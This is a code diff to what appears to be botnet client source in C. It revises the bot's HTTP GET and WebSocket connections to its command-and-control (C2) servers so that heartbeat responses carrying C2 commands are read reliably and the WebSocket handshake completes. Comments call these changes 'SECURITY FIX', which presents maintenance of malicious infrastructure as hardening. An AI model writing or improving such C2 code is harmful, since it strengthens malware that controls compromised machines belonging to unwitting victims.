@@ -445,44 +445,60 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
 
     return 0;
 }
+/* Forward declaration: tcp_connect_sock defined below (used by http_get). */
+static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);
 
 int http_get(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_http.connected) return -1;
-    
+
+    /* SECURITY FIX (#47): GET runs on a dedicated fresh connection, never
+     * on the shared keep-alive POST socket. The heartbeat POST response
+     * (which carries C2 commands) is read by http_read() on the shared
+     * socket; issuing a GET on the same socket risks attributing the GET
+     * response to a pending POST response (or vice versa). A dedicated
+     * Connection: close request isolates the request/response pair. */
+    int sock = tcp_connect_sock(bot, bot->c2_http.server, bot->c2_http.port);
+    if (sock < 0) {
+        log_warn("HTTP: GET connect failed: %s", strerror(errno));
+        return -1;
+    }
+
     char req[1024];
-    snprintf(req, sizeof(req),
+    int reqlen = snprintf(req, sizeof(req),
         "GET %s HTTP/1.1\r\n"
         "Host: %s\r\n"
         "User-Agent: %s\r\n"
         "Connection: close\r\n"
         "\r\n",
         bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
-    
-    int sent = send(bot->c2_http.sock, req, strlen(req), 0);
-    if (sent < 0) {
+
+    int sent = send(sock, req, reqlen, 0);
+    if (sent < 0 || sent != reqlen) {
         log_warn("HTTP: GET send failed: %s", strerror(errno));
+        close(sock);
         return -1;
     }
-    
+
     /* Read response with 10s timeout to prevent indefinite blocking */
     int total = 0;
     while (total < len - 1) {
         fd_set read_fds;
         struct timeval tv;
         FD_ZERO(&read_fds);
-        FD_SET(bot->c2_http.sock, &read_fds);
+        FD_SET(sock, &read_fds);
         tv.tv_sec = 10;
         tv.tv_usec = 0;
 
-        int sel = select(bot->c2_http.sock + 1, &read_fds, NULL, NULL, &tv);
+        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
         if (sel <= 0) break;  /* timeout or error */
 
-        int received = recv(bot->c2_http.sock, buf + total, len - total - 1, 0);
+        int received = recv(sock, buf + total, len - total - 1, 0);
         if (received <= 0) break;
         total += received;
     }
     buf[total] = '\0';
-    
+    close(sock);
+
     return total;
 }
 
@@ -883,6 +899,54 @@ int ws_connect(notnet_bot_t *bot) {
     socklen_t len = sizeof(so_error);
     getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
     if (so_error != 0) {
+        close(sock);
+        return -1;
+    }
+    
+    /* SECURITY FIX (#46): Send WebSocket upgrade request per RFC 6455.
+     * Raw TCP connect is not enough — the server must respond with
+     * HTTP 101 Switching Protocols. Without the handshake the bot
+     * would be talking on raw frames to a non-upgraded connection. */
+    char ws_key[24];
+    random_string(ws_key, sizeof(ws_key));
+    
+    char upgrade_req[2048];
+    snprintf(upgrade_req, sizeof(upgrade_req),
+             "GET /%s HTTP/1.1\r\n"
+             "Host: %s:%d\r\n"
+             "Upgrade: websocket\r\n"
+             "Connection: Upgrade\r\n"
+             "Sec-WebSocket-Key: %s\r\n"
+             "Sec-WebSocket-Version: 13\r\n"
+             "\r\n",
+             bot->c2_ws.path, bot->c2_ws.server, bot->c2_ws.port, ws_key);
+    
+    send(sock, upgrade_req, strlen(upgrade_req), 0);
+    
+    /* Read 101 response (non-blocking) */
+    char response[1024] = {0};
+    int received = 0;
+    while (received < (int)sizeof(response) - 1) {
+        fd_set rfd;
+        struct timeval tv;
+        FD_ZERO(&rfd);
+        FD_SET(sock, &rfd);
+        tv.tv_sec = 1;
+        tv.tv_usec = 0;
+        if (select(sock + 1, &rfd, NULL, NULL, &tv) <= 0) {
+            log_warn("WS: upgrade request timed out");
+            close(sock);
+            return -1;
+        }
+        int r = recv(sock, response + received, sizeof(response) - received - 1, 0);
+        if (r <= 0) break;
+        received += r;
+    }
+    response[received] = '\0';
+    
+    /* Check for 101 Switching Protocols */
+    if (!strstr(response, "101")) {
+        log_warn("WS: no 101 response received — handshake failed");
         close(sock);
         return -1;
     }
